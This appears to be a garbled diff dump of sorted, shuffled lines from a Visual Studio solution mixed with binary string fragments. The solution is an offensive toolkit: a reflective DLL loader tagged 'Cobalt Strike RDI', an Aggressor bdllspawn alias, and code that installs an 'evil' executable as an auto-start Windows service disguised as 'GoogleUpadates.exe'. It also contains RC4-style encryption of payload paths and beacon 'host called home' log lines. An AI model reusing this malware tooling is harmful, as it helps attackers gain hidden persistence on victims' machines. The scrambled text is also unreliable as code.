@@ -1,0 +1,2945 @@
+                          
+        <requestedExecutionLevel level='asInvoker' uiAccess='false' />
+      </PrecompiledHeader>
+      </PrecompiledHeaderFile>
+      </requestedPrivileges>
+      <Configuration>Debug</Configuration>
+      <Configuration>Release</Configuration>
+      <ConformanceMode>true</ConformanceMode>
+      <DisableSpecificWarnings>4996</DisableSpecificWarnings>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <EnableUAC>false</EnableUAC>
+      <Extensions>cpp
+      <Extensions>h
+      <Extensions>rc
+      <Filter>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <Optimization>Disabled</Optimization>
+      <Optimization>MaxSpeed</Optimization>
+      <OptimizeReferences>true</OptimizeReferences>
+      <Platform>Win32</Platform>
+      <Platform>x64</Platform>
+      <PrecompiledHeader>
+      <PrecompiledHeader>NotUsing</PrecompiledHeader>
+      <PrecompiledHeader>Use</PrecompiledHeader>
+      <PrecompiledHeaderFile>
+      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
+      <PreprocessorDefinitions>NDEBUG
+      <PreprocessorDefinitions>WIN32
+      <PreprocessorDefinitions>_DEBUG
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <SDLCheck>true</SDLCheck>
+      <SubSystem>Console</SubSystem>
+      <SubSystem>Windows</SubSystem>
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <WarningLevel>Level3</WarningLevel>
+      <requestedPrivileges>
+    1 
+    2 
+    3 
+    </ClCompile>
+    </ClInclude>
+    </Filter>
+    </Link>
+    </ProjectConfiguration>
+    </security>
+    <CharacterSet>MultiByte</CharacterSet>
+    <CharacterSet>NotSet</CharacterSet>
+    <CharacterSet>Unicode</CharacterSet>
+    <ClCompile>
+    <ConfigurationType>Application</ConfigurationType>
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <Keyword>Win32Proj</Keyword>
+    <Link>
+    <LinkIncremental>false</LinkIncremental>
+    <LinkIncremental>true</LinkIncremental>
+    <PlatformToolset>v140</PlatformToolset>
+    <PlatformToolset>v142</PlatformToolset>
+    <ProjectGuid>{22020898-6F0D-4D71-B14D-CB5897C5A6AA}</ProjectGuid>
+    <ProjectGuid>{580ba177-cf9a-458c-a692-36dd6f23ea77}</ProjectGuid>
+    <ProjectGuid>{cf25b9f3-849e-447f-a029-2fef5969eca3}</ProjectGuid>
+    <RootNamespace>CreateService</RootNamespace>
+    <RootNamespace>CreateServiceDll</RootNamespace>
+    <RootNamespace>TransitEXE</RootNamespace>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <VCProjectVersion>16.0</VCProjectVersion>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <WindowsTargetPlatformVersion>10.0.10586.0</WindowsTargetPlatformVersion>
+    <WindowsTargetPlatformVersion>8.1</WindowsTargetPlatformVersion>
+    <security>
+    [
+   [
+   [-] Create Error!
+   [-] Delete Error!
+   [-] Start Error!
+   [-] Stop Error!
+   s
+  </ImportGroup>
+  </ItemDefinitionGroup>
+  </ItemGroup>
+  </PropertyGroup>
+  </trustInfo>
+  <ItemGroup>
+  <PropertyGroup />
+ $s%r
+ ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock
+ ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress)
+ ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress)
+ ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress)
+ ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew
+ ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew
+ ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions)
+ ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals)
+ ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames)
+ ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk)
+ ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name))
+ ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk)
+ ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
+ ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader)
+ ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader 
+ ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint)
+ ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
+ ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
+ ((PIMAGE_RELOC)uiValueD)->offset 
+ ((PIMAGE_RELOC)uiValueD)->offset) 
+ ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData)
+ ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress)
+ ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal 
+ // As we search from PPEB_LDR_DATA->InMemoryOrderModuleList we dont use the first entry.
+ 0J0R0o0
+ 0x000000FF)
+ 0x00007000) >> 4)
+ 0x000F0000) >> 4)
+ 0x00FF)
+ 0x04000000) >> 15)
+ 0x0700) << 4
+ 0x0800) << 15
+ 0xF000) << 4
+ 0xFFFF
+ 1) % 256
+ <<<U==z>>
+ ARM_MOV_MASK) == ARM_MOVT)
+ ARM_MOV_MASK2)
+ Base Class Array'
+ Base Class Descriptor at (
+ Class Hierarchy Descriptor'
+ Cobalt Strike RDI
+ Complete Object Locator'
+ CreateService
+ DEREF(uiValueA))
+ DEREF_32(uiAddressArray))
+ DEREF_32(uiNameArray)))
+ IMAGE_ORDINAL_FLAG)
+ LOADLIBRARYA)(LPCSTR)
+ Neither the name of Harmony Security nor the names of its contributors may be used to
+ OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
+ PIMAGE_RELOC
+ PLDR_DATA_TABLE_ENTRY
+ PPEB_FREE_BLOCK
+ PPEB_LDR_DATA
+ PUNICODE_STR
+ REFLECTIVELOADER)(VOID)
+ SERVICE_ACCEPT_SHUTDOWN 
+ Type Descriptor'
+ Visual Studio 14
+ YUVu
+ _PPEB
+ argv[100]
+ argv[])
+ delete
+ delete[]
+ dwHashValue == GETPROCADDRESS_HASH 
+ dwHashValue == VIRTUALALLOC_HASH)
+ enName = argv[2]
+ evilName = argv[1]
+ evilName = argv[2]
+ exepath)
+ flush STDOUT 
+ i < 256
+ k[i]) % 256
+ l < Length
+ lpServiceArgVectors
+ new
+ new[]
+ pGetProcAddress 
+ pNext
+ pNtFlushInstructionCache)
+ pVirtualAlloc 
+ print some output to the operator 
+ s[i] 
+ s[i]) % 256
+ s[j]) % 256
+ sizeof(DWORD))
+ sizeof(IMAGE_BASE_RELOCATION)
+ szFileName = argv[0]
+ szFileName = argv[1]
+ szName
+ uiHeaderValue < 1024)
+ wImm) 
+!0-0A0V000000011233
+!3VV
+!=X=_=d=h=l=p==
+"    $args = substr($0, 14)"
+"    <ClCompile Include=""ReflectiveDll.cpp"" />"
+"    <ClCompile Include=""ReflectiveDll.cpp"">"
+"    <ClCompile Include=""ReflectiveLoader.cpp"" />"
+"    <ClCompile Include=""ReflectiveLoader.cpp"">"
+"    <ClCompile Include=""main.cpp"" />"
+"    <ClCompile Include=""main.cpp"">"
+"    <ClInclude Include=""ReflectiveDLLInjection.h"" />"
+"    <ClInclude Include=""ReflectiveDLLInjection.h"">"
+"    <ClInclude Include=""ReflectiveLoader.h"" />"
+"    <ClInclude Include=""ReflectiveLoader.h"">"
+"    <Filter Include="""
+"    <Import Project=""$(UserRootDir)"
+"    <ProjectConfiguration Include=""Debug"
+"    <ProjectConfiguration Include=""Release"
+"    bdllspawn($1, script_resource($dll), $args, ""CreateService ...."", 10000, false)"
+"  <Import Project=""$(VCTargetsPath)"
+"  <ImportGroup Label=""ExtensionSettings"">"
+"  <ImportGroup Label=""ExtensionTargets"">"
+"  <ImportGroup Label=""PropertySheets"" Condition=""'$(Configuration)"
+"  <ImportGroup Label=""Shared"">"
+"  <ItemDefinitionGroup Condition=""'$(Configuration)"
+"  <ItemGroup Label=""ProjectConfigurations"">"
+"  <PropertyGroup Condition=""'$(Configuration)"
+"  <PropertyGroup Label=""Globals"">"
+"  <PropertyGroup Label=""UserMacros"" />"
+"  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v3"">"
+" DLLMAIN)(HINSTANCE, DWORD, LPVOID)"
+" Data, long Length, char "
+" GETPROCADDRESS)(HMODULE, LPCSTR)"
+" Key, int KeyLength)"
+" LOSS OF USE, DATA, OR PROFITS"
+" MEM_COMMIT, PAGE_EXECUTE_READWRITE)"
+" NTFLUSHINSTRUCTIONCACHE)(HANDLE, PVOID, ULONG)"
+" Redistributions in binary form must reproduce the above copyright notice, this list of "
+" Redistributions of source code must retain the above copyright notice, this list of "
+" SERVICE_INTERACTIVE_PROCESS,"
+" VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD)"
+" lpszDriverPath, int iOperateType)"
+" outpath, char"
+" sizeof(DWORD)) = MAKELONG(HIWORD(dwInstruction), LOWORD(dwInstruction))"
+" we're done, so let's exit "
+""" EvilService start/stop"
+"""B <1="
+"""CreateService beacon log"", "
+"""CreateService"", "
+"""Dqj"""
+"""Main Invoked."""
+"""Main Returned."""
+"""Synopsis: CreateService [TransitPathName] [EvilPathName] [ServiceName] [start/stop] "
+"""VW_"
+"""YY]"
+"$dll = ""reflective_dll.dll"""
+"((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL)"
+"((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter)"
+")lpReserved, "" "")"
+")pBuffer, totalSize)"
+",$Zf"
+",-./0123456789:"
+",343<3D3L3T3"
+",S3C"
+",dH9"
+",ssN0,e3P,P0SP"
+",tw330j"
+"-""RP("
+".=k=yICyJ""p"
+"// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR "
+"// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR "
+"// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)"
+"// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND"
+"// Note 1: If you want to have your own DllMain, define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN,  "
+"// Note 2: If you are injecting the DLL via LoadRemoteLibraryR, define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR,"
+"// Note: On ARM, the compiler optimization /O2 seems to introduce an off by one issue, possibly a code gen bug. Using /O1 instead avoids this problem."
+"// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE "
+"// Redistribution and use in source and binary forms, with or without modification, are permitted "
+"// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR "
+"// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS"" AND ANY EXPRESS OR "
+"// call our respective entry point, fudging our hInstance value"
+"// itterate through all imported functions, importing by ordinal if no name present"
+"// itterate through all sections, loading them into memory."
+"// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required."
+"// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems."
+"// some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),"
+"//lstrcpy(szName, lpszDriverPath)"
+"0$0,040<0D0L0T0"
+"0%0,090z00000"
+"1$1,141<1D1L1T1"
+"2""23"
+"2$2,242<2D2L2T2"
+"2(2,2"
+"21262B2G2X22222,3>3F3P3Y3j3"
+"22224444""5'5K6j6666"
+"2Dv,Y"
+"3$3,343<3D3L3T3"
+"3,3g3333"
+"3,>A"
+"3,Pr"
+"3P,P0SP"
+"3P,P0SPG"
+"3P,P0SPi"
+"3VW"""
+"3W3<,<A"
+"4 4$4(4,4044484<4@4D4H4L4P4T4X4"
+"4""4D4R4a4444F5"
+"4""4U4"
+"4$4,444<4D4L4T4"
+"4,4<4T4"
+"404<4L4]4444444""5/5V5"
+"5.5@5a5s55556(7777""99J:::p"
+"5w5555555,646"
+"6,666"
+"6,666p7"
+"7 7$7(7,7074787<7@7D7H7L7P7T7X7"
+"7""7'77777768<880969W<E=O="
+"7,7A7F7P7U7"
+"7xB"">"
+"8""8K8T88888888"
+"8,8=8E8U8f88888839"
+"9,949{99999999"
+":$:,:4:<:<"
+"< <$<(<,<0<4<8<<<@<D<H<L<P<T<X<"
+"< <,<4<8<<<@<D<==================="
+"<Project DefaultTargets=""Build"" ToolsVersion=""14.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<Project DefaultTargets=""Build"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<Project ToolsVersion=""Current"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<Xu]A,"
+"= =$=(=,=0=4=8=<=@=D=H=L=P=T=X="
+"======"">M>o>>>>"
+">$>,>4><>D>L>T>"
+"@$""3"
+"@@w,=q/"
+"BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)"
+"ControlService(shService, SERVICE_CONTROL_STOP, "
+"CreateProcess(filename, NULL, NULL, NULL, false, 0, NULL, NULL, "
+"CreateService.vcxproj"", ""{580BA177-CF9A-458C-A692-36DD6F23EA77}"""
+"CreateServiceDll.vcxproj"", ""{CF25B9F3-849E-447F-A029-2FEF5969ECA3}"""
+"DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name)"
+"DWORD dwNumServicesArgs,"
+"DWORD totalSize = SizeofResource(NULL, hRsrc)"
+"Desktop>CreateService.exe ""C:"
+"EYt""uSWu"
+"EndUpdateResource(hResource, FALSE)"
+"Ev""E]"
+"GetPathFromRes(100, filename)"
+"HANDLE  g_Handle = CreateMutex(NULL, FALSE, ""hello"")"
+"HANDLE  hResource = BeginUpdateResource(outpath, FALSE)"
+"HGLOBAL hGlobal = LoadResource(NULL, hRsrc)"
+"HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA)"
+"HuYUW=,"
+"L$,3"
+"M>""u"
+"MQWPV,:"
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.Cpp.$(Platform).user.props"" Condition=""exists('$(UserRootDir)"
+"Microsoft.Cpp.$(Platform).user.props')"" Label=""LocalAppDataPlatform"" />"
+"Microsoft.Cpp.Default.props"" />"
+"Microsoft.Cpp.props"" />"
+"Microsoft.Cpp.targets"" />"
+"P""PE"
+"P,=87Msgm"
+"P,P0SP"
+"P,P0SP)"
+"P,P0SPE"
+"P,P0SPh"
+"P,PYYj"
+"P,PZYYj"
+"P,YtE"
+"P0Y0V5,"
+"PY8W5,"
+"Project(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"") = ""CreateService"", ""CreateService"
+"Project(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"") = ""CreateServiceDll"", ""CreateServiceDll"
+"Project(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"") = ""TransitEXE"", ""TransitEXE"
+"RSDS""PC"
+"Rh,@"
+"Rhr,@"
+"SC_HANDLE shSCManager = NULL, shService = NULL"
+"SERVICE_ALL_ACCESS,"
+"SERVICE_AUTO_START,"
+"SERVICE_ERROR_NORMAL,"
+"StartService(shService, 0, NULL)"
+"StreamCrypt(evilName, strlen(evilName), getenv(""PROCESSOR_REVISION""), strlen(getenv(""PROCESSOR_REVISION"")))"
+"StreamCrypt(exepath, strlen(exepath), getenv(""PROCESSOR_REVISION""), strlen(getenv(""PROCESSOR_REVISION"")))"
+"StreamCrypt(fname, strlen(fname), getenv(""PROCESSOR_REVISION""), strlen(getenv(""PROCESSOR_REVISION"")))"
+"TCHAR szServiceName[MAX_PATH] = ""GoogleUpadates.exe"""
+"TransitEXE.exe"" ""C:"
+"TransitEXE.vcxproj"", ""{22020898-6F0D-4D71-B14D-CB5897C5A6AA}"""
+"U,>A"
+"UQQ3!EfE}=,"
+"UQQ33fEM}=,"
+"USVv,FY"
+"UVh"""
+"UVh""A"
+"Ueu,t6"
+"VWv,"
+"VYt9t"""
+"WP""K"
+"Win32"">"
+"Win32'"" Label=""Configuration"">"
+"Win32'"">"
+"X<XF"""
+"YYhP,A"
+"Yue=,"
+"Z,$Z"
+"[""93u"
+"[M3""E]"
+"[]QU%,"
+"] eg: %s ""c:"
+"] host called home, sent: 103052 bytes"
+"] host called home, sent: 103053 bytes"
+"]U=,A"
+"]UVh"""
+"]UVh""A"
+"_[]UVhl"""
+"_[]UVhx""A"
+"alias(""CreateService"", {"
+"argv[c] = strtok(NULL, "" "")"
+"bRet = SystemServiceOperate(szFileName, 0)"
+"bRet = SystemServiceOperate(szFileName, 1)"
+"bRet = SystemServiceOperate(szFileName, 2)"
+"bRet = SystemServiceOperate(szFileName, 3)"
+"blog($1, ""arguments are:"" . substr($0, 14))"
+"char k[256] = { 0 }, s[256] = { 0 }"
+"d8L2WBJa""="
+"dddd, MMMM dd, yyyy"
+"dwInstruction = MAKELONG(HIWORD(dwInstruction), LOWORD(dwInstruction))"
+"e,Bb"
+"else if (strcmp(argv[3], ""stop"") == 0)"
+"else if (strcmp(argv[4], ""start"") == 0) {"
+"else if (strcmp(argv[4], ""stop"") == 0)"
+"evil.exe"" EvilService start/stop"
+"f37>,"
+"g5,A"
+"g_ServiceStatusHandle = RegisterServiceCtrlHandler(szServiceName, LphandlerFunction)"
+"h8""A"
+"hP,A"
+"hX""A"
+"ht""A"
+"hx""A"
+"h}s""="
+"i = 0, j = 0, tmp = 0"
+"if (!AddResource(argv[1], enName))"
+"if (!AddResource(szFileName, argv[1]))"
+"if (UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(100), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), Path, strlen(Path)) != FALSE)"
+"if (strcmp(argv[3], ""start"") == 0) {"
+"include ""ReflectiveDLLInjection.h"""
+"include ""ReflectiveLoader.h"""
+"int GetPathFromRes(int resourceID, char "
+"int c, i"
+"int i = 0, j = 0"
+"int main(int argc, TCHAR"
+"j""30"
+"j""31H"
+"j""3G"
+"j""_8"
+"j,h@"
+"juvD,GA"
+"lpszDriverPath, NULL, NULL, NULL, NULL, NULL)"
+"memcpy(fname, (char"
+"n"", argv[0])"
+"n"", argv[1])"
+"n"", evilName)"
+"n"", szFileName)"
+"n"", szName)"
+"operator """" "
+"p,qE"
+"pNtFlushInstructionCache((HANDLE)-1, NULL, 0)"
+"pragma comment(lib, ""Shlwapi.lib"")"
+"printf(""    ["
+"printf(""   ["
+"printf(""   [-] Create Error!"
+"printf(""   [-] Delete Error!"
+"printf(""   [-] Start Error!"
+"printf(""   [-] Stop Error!"
+"printf(""["
+"return _rotr(d, HASH_KEY)"
+"return(SetServiceStatus(g_ServiceStatusHandle, "
+"shSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)"
+"shService = CreateService(shSCManager, szName, szName,"
+"shService = OpenService(shSCManager, szName, SERVICE_ALL_ACCESS)"
+"si, "
+"strcpy(Path, exepath)"
+"t$,v-4v"
+"t(vL"""
+"t,7u4"
+"t,Vu"
+"t/v,"
+"t>""u1"
+"t@,ss"
+"tB,ss"
+"test.exe"" test start"
+"transit.exe"" ""c:"
+"typedef struct _PEB_FREE_BLOCK // 2 elements, 0x8 bytes"
+"typedef struct _PEB_LDR_DATA //, 7 elements, 0x28 bytes"
+"typedef struct __PEB // 65 elements, 0x210 bytes"
+"u'V,<A"
+"u,Puu u"
+"uiBaseAddress = (ULONG_PTR)pVirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE "
+"ux,0<"
+"x64"">"
+"x64'"" Label=""Configuration"">"
+"x64'"">"
+"xml version=""1.0"" encoding=""utf-8"""
+"zu7A,"
+"{ NULL, NULL }"
+"{ szServiceName, LpserviceMainFunctiona },"
+"{,Ji"
+"} IMAGE_RELOC, "
+"} LDR_DATA_TABLE_ENTRY, "
+"} PEB_FREE_BLOCK, "
+"} PEB_LDR_DATA, "
+"} UNICODE_STR, "
+"} _PEB, "
+$(Platform)'=='Debug
+$(Platform)'=='Release
+$00011a22
+$00011a222222
+$00011j23333
+$3[_
+$<P<<<<<<<
+$D>A
+$qE}
+$sF 
+% <A
+%(<A
+%(PreprocessorDefinitions)</PreprocessorDefinitions>
+%0b0l000
+%39E
+%{pk
+( 8PX
+( oA
+((BYTE
+(-0iA
+(5 iA
+(@iA
+(BYTE
+(BYTE 
+(DWORD
+(DWORD 
+(DWORD)(0xFBF08000)
+(DWORD)(0xFBF08F00)
+(DWORD64 
+(HMODULE
+(UINT_PTR 
+(ULONG_PTR
+(WORD
+(WORD 
+(_M36]UL
+(lX 
+(null)
+)(name)
+)(uiBaseAddress 
+)(uiValueA 
+)0w0000000000000000
+)Q9%
+)[f.
+)lpReserved = hAppInstance
+)uiValueB
+)uiValueB)
+)uiValueB) - 0x20
+)uiValueB) >= 'a')
+)uiValueC
+- CreateService : 
+- CreateServiceDll 
+- TransitEXE 
+-!y!=
+->Preprocessor) so as we can specify our own 
+-Ciu
+-P:<4
+-P:V
+-PjA
+-V0YtW
+-djA
+-jd_
+-lhA
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.EEj
+.X'=
+.bss
+.data
+.edata
+.gfids
+.gfids$x
+.gfids$y
+.i1=
+.idata$2
+.idata$3
+.idata$4
+.idata$5
+.idata$6
+.rdata
+.rdata$sxdata
+.rdata$zETW0
+.rdata$zETW1
+.rdata$zETW2
+.rdata$zETW9
+.rdata$zzzdbg
+.rsrc$01
+.rsrc$02
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.tEE
+.text
+.text$mn
+.xdata$x
+//     
+//         otherwise it is assumed you are calling the ReflectiveLoader via a stub.
+//         otherwise the DllMain at the end of this file will be used.
+// 0 
+// All rights reserved.
+// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.
+// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
+// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
+// Our loader will set this to a pseudo correct HINSTANCE/HMODULE value
+// POSSIBILITY OF SUCH DAMAGE.
+// RIP relative addressing in this instance but I dont believe we can do so with the compiler intrinsics 
+// SERVICES
+// SERVICE_AUTO_START   
+// SERVICE_DEMAND_START 
+// STEP 0: calculate our images current base address
+// STEP 1: process the kernels exports for the functions our loader needs...
+// STEP 2: load our image into a new permanent location in memory...
+// STEP 3: load in all of our sections...
+// STEP 4: process our images import table...
+// STEP 5: process all of our images relocations...
+// STEP 6: call our images entry point
+// STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.
+// This function can not be inlined by the compiler or we will not get the address we expect. Ideally 
+// This is a stub for the actuall functionality of the DLL.
+// This is our position independent reflective DLL loader/injector
+// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
+// WinDbg> dt -v ntdll!_LDR_DATA_TABLE_ENTRY
+// WinDbg> dt -v ntdll!_PEB
+// WinDbg> dt -v ntdll!_PEB_FREE_BLOCK
+// WinDbg> dt -v ntdll!_PEB_LDR_DATA
+// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
+// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
+// and we itterate through all entries...
+// apply the relocation to the target address
+// available (and no inline asm available under x64).
+// break if we have found a valid MZ/PE header
+// calculate the base address delta and perform relocations (even if we load at desired image base)
+// check if their are any relocations present
+// clear uiValueC which will store the hash of the module name
+// compare the hash with that of kernel32.dll
+// compute the hash of the module name...
+// compute the hash values for this function name
+// conditions and the following disclaimer in the documentation and/or other materials provided 
+// conditions and the following disclaimer.
+// copy the section over
+// decrement our counter
+// defined in the project properties (Properties->C
+// endorse or promote products derived from this software without specific prior written permission.
+// flip the words to get the instruction as expected
+// get pointer to current modules name (unicode string)
+// get the MOV.T instructions DWORD value (We add 4 to the offset to go past the first MOV.W which handles the low word)
+// get the Process Enviroment Block
+// get the VA for the array of addresses
+// get the VA for the array of name ordinals
+// get the VA for the array of name pointers
+// get the VA of the NT Header for the PE to be loaded
+// get the VA of the export directory
+// get the VA of the modules NT Header
+// get the VA of the next section
+// get the VA of this functions import by name struct
+// get the first entry of the InMemoryOrder module list
+// get the next entry
+// get the next entry in the current relocation block
+// get the next entry in the relocation directory
+// get the next exported function name
+// get the next exported function name ordinal
+// get the next import
+// get the next imported function
+// get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx
+// get this modules base address
+// if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)
+// if we are injecting an DLL via a stub we call DllMain with no parameter
+// if we have found a function we want we get its virtual address
+// itterate through all imports
+// loop through memory backwards searching for our images base address
+// loop while we still have imports to find
+// normalize to uppercase if the madule name is in lowercase
+// now create a new instruction with the same opcode and register param.
+// now flip the instructions words and patch back into the code...
+// patch in the address for this imported function
+// patch in the relocated address...
+// provided that the following conditions are met:
+// pull out the encoded 16bit value (the high portion of the address-to-relocate)
+// sanity chack we are processing a MOV instruction...
+// sanity check uiValueD as some compilers only import by FirstThunk
+// set bCounter to the length for the loop
+// store this functions VA
+// struct _PEB is defined in Winternl.h but it is incomplete
+// the functions we need
+// the initial location of this image in memory
+// the kernels base address and later this images newly loaded base address
+// this code will be compiled with the /O2 and /Ob1 switches. Bonus points if we could take advantage of 
+// uiNameArray = the address of the modules export directory entry
+// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
+// uiValueA = the VA for this relocation block
+// uiValueA = the VA of our newly loaded DLL/EXE's entry point
+// uiValueA = the VA of the first section
+// uiValueB = number of entries in this relocation block
+// uiValueB = the address of the import directory
+// uiValueB = the address of the relocation directory
+// uiValueB is the VA for this section
+// uiValueC if the VA for this sections data
+// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
+// uiValueC is the first entry in the import table
+// uiValueD = VA of the OriginalFirstThunk
+// uiValueD is now the first entry in the current relocation block
+// use GetProcAddress and patch in the address for this imported function
+// use LoadLibraryA to load the imported module into memory
+// use the import ordinal (- export ordinal base) as an index into the array of addresses
+// use this functions name ordinal as an index into the array of name pointers
+// variables for loading this image
+// variables for processing the kernels export table
+// we assume their is an import table to process
+// we declare some common stuff in here...
+// we dont need SEH style search as we shouldnt generate any access violations with this
+// we dont use a switch statement to avoid the compiler building a jump table
+// we itterate through all the entries in the current block...
+// we must now copy over the headers
+// we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
+// we stop searching when we have found everything we need.
+// we will start searching backwards from our callers return address.
+// which would not be very position independent!
+// with the distribution.
+//1.Get resource's pointer
+//2.Initialization
+//===============================================================================================//
+//LIST_ENTRY InLoadOrderLinks
+//LPSERVICE_MAIN_FUNCTIONA LpserviceMainFunctiona
+//PathStripPath(szName)
+//__declspec( align(8) ) 
+//char szName[MAX_PATH] = { 0 }
+/3fEE
+/5 A
+/u u
+0 0(00080@0H0P0X0
+0 0G0
+0!0-0
+0$0X0
+0$Ye
+0'lUj
+0(0H0P0T0p000000
+000000
+00000000000000000
+00002222222F333333
+00003
+00011
+01-2J3f3346666
+010I0000000011=1Q1]1i1111
+0111111111666666666666
+022222
+030F0y000000000000!1
+030O00
+04080
+0511K2b2233l4
+090M0V0333v4556d7h7l7p7t7x7
+0:Yj
+0<1R111111
+0<PY3}
+0>0H0Y0d0j000000
+0>0P000000000
+0D1k111
+0GYe
+0H89t
+0HNt
+0HYe
+0Hu3uj
+0P05555
+0P0h11111111
+0P0p1111111
+0S00001
+0VSW}
+0WPQ
+0WPQE
+0YuE
+0]0m0r0w0000000
+0d0l0t0
+0ffffffE
+0h0p0x00000000000000000
+0i0u0z0000000
+0k0t0y00000001>1Y1d111
+0n00
+0o0{00000
+0oYe
+0v23
+0x3CFA685D
+0x534C0AB8
+0x6A4ABC5B
+0x7C0DFCAA
+0x91AFCA54
+0xEC0E4E8E
+0xF2400000
+0xF2C00000
+0xSW}
+0yYe
+1 1(10181@1H1P1X1
